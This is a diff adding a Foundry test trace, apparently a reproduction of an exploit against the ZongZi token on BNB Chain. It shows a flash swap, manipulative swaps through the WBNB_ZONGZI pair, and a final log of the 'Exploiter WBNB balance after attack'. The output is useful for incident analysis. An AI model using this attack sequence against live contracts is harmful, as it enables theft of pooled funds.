+    │   │   │   │   │   │   │   @ 0xce5a46cd565c798db4579e1721082d7b4156f14a385995b283ae5d8d572faf65: 0x000000000000000000000000000000000000000000008af655dc633e6cb0c5db → 0x00000000000000000000000000000000000000000000c6ed72f7d251e222d3fd
+    │   │   │   │   │   │   │   @ 11: 0x0000000000000000003d23e29900927f5326e559b65a25cd5f9deb523d8334d8 → 0x0000000000000000003d52418df42fbfdebf68a1371377b56506eceb6bda2c30
+    │   │   │   │   │   │   │   @ 8: 0x660135098664b340dea8e84c9ae89de1639e0000000000748c554bd49a650f8f → 0x66013509868b11853ed249fee8b7815f389f000000000074ad9b54bd3334f5d0
+    │   │   │   │   │   │   │   @ 0x8ff53ce6baf2922ba519d18a95cc0cd8efa766a893cf420a213b256f9e2dad5d: 0x0000000000000000000000000000000000000000002db69f5f07b2cd77010e79 → 0x0000000000000000000000000000000000000000002ff3fb7786c43a9fdeb220
+    │   │   │   │   │   │   │   @ 0: 0x000000000000000000000000000000000000000007d816574ccc2b261b5b3f84 → 0x000000000000000000000000000000000000000007da8faa8266aba6b9aaf14d
+    │   │   │   │   │   │   └─ ← [Return] 2707614860287827473441703 [2.707e24]
+    │   │   │   │   │   ├─ [55] ZongZi::fallback{value: 9215888173145102}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000265e44602961b24dcee37dd501000000000000000000000000000000000000000000000000214608e898cfe641000000000000000000000000000000000000000000023d5c187f116d28dda3a7
+    │   │   │   │   ├─ [0] 0xe516c9C7924Efa19532Bf0e95eCD2647C5a16399::fallback{value: 4813659069767419039}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [55] 0xDe0cB15C6aa16D220549430B0ab90Beb3694D10b::fallback{value: 1604553023255806346}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [3891] 0xDe0cB15C6aa16D220549430B0ab90Beb3694D10b::addReward(1604553023255806346 [1.604e18])
+    │   │   │   │   │   ├─ emit RewardAdded(reward: 1604553023255806346 [1.604e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x000000000000000000000000000000000000000000000000000037873c5b451b → 0x00000000000000000000000000000000000000000000000000003937a16d5621
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 182390665651891421821513227955281 [1.823e32])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984462984268861801337539565098578512 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 1 → 0x00000000000000000000000000000000000000ffc9c7d66935fa06b89746e15f
+    │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0 → 0x00000000000000000000000000000000000000d96b83763fd447b8e9b3c90c5d
+    │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000868b11853ed249fee8b7815f389f → 0x0000000000000000000000000000000000008f89298bc8852fc92534d2dd24f0
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000009fde1ce61fded8b709180a4cdaf → 0x0000000000000000000000000000000000000000000001e1d1c72d5b97e00000
+    │   │   │   │   │   @ 0x44bf1039324fcbfda472196706fa68525cb38db0f3d91f5ca7d489ff92357e45: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffff6021e319e0212748f6e7f5b3250
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2158209956815657765815 [2.158e21]
+    │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 2152331998111844333008 [2.152e21], 2728861023807773421494563548117151 [2.728e33], 1711355145 [1.711e9]
+    │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2911251689459664843316076776072432 [2.911e33]
+    │   │   │   ├─ [18480] WBNB_ZONGZI::swap(134528112348636113925 [1.345e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [3262] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 134528112348636113925 [1.345e20])
+    │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 134528112348636113925 [1.345e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x000000000000000000000000000000000000000000000074ad9b54bd3334f5d0 → 0x00000000000000000000000000000000000000000000006d62a7775186e909cb
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000074ff2e0909946c0bb7 → 0x00000000000000000000000000000000000000000000007c4a21e67540b7f7bc
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2017803885763208219083 [2.017e21]
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2911251689459664843316076776072432 [2.911e33]
+    │   │   │   │   ├─ emit Sync(reserve0: 2017803885763208219083 [2.017e21], reserve1: 2911251689459664843316076776072432 [2.911e33])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 182390665651891421821513227955281 [1.823e32], amount0Out: 134528112348636113925 [1.345e20], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x66013509868b11853ed249fee8b7815f389f000000000074ad9b54bd3334f5d0 → 0x660135098f89298bc8852fc92534d2dd24f000000000006d62a7775186e909cb
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2292738069164293879740 [2.292e21]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WBNB::transfer(BUSDT_WBNB: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], 1909299130434782608695 [1.909e21])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BUSDT_WBNB: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], value: 1909299130434782608695 [1.909e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x65a91b743eebb93754974b0d76ae6fbcc9c7843adbbd90f71368692e5c22fe4d: 0x00000000000000000000000000000000000000000000042a9c5dbb1d416367ea → 0x0000000000000000000000000000000000000000000004921d36de5828d12521
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000007c4a21e67540b7f7bc → 0x000000000000000000000000000000000000000000000014c948c33a594a3a85
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(BUSDT_WBNB: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   └─ ← [Return] 12609009622645004456337763 [1.26e25]
+    │   ├─ [534] WBNB::balanceOf(BUSDT_WBNB: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   └─ ← [Return] 21584795680586240959777 [2.158e22]
+    │   ├─ emit Sync(reserve0: 12609009622645004456337763 [1.26e25], reserve1: 21584795680586240959777 [2.158e22])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 1909299130434782608695 [1.909e21], amount0Out: 0, amount1Out: 1904347826086956521739 [1.904e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 9: 0x00000000000000000000000000000004802207769c4ec601fbb3cf8d78d2a5a2 → 0x0000000000000000000000000000000480220a1795bdf011b88729b29b098c04
+    │   │   @ 10: 0x000000000000000000000000000745a6780e83ba391b0a07a2c36ab67d6dc7de → 0x000000000000000000000000000745a685c049e04b68a014b54cfd99b5a31466
+    │   │   @ 8: 0x66013503000000000491d8804d45edcbc0f50000000a6e0fc8027f8030eea163 → 0x660135090000000004921d36de5828d125210000000a6e0fc8027f8030eea163
+    │   └─ ← [Stop]
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 383438938729511271045 [3.834e20]
+    ├─ emit log_named_decimal_uint(key: "Exploiter WBNB balance after attack", val: 383438938729511271045 [3.834e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 35.77s (24.11s CPU time)
+
+Ran 1 test suite in 42.37s (35.77s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
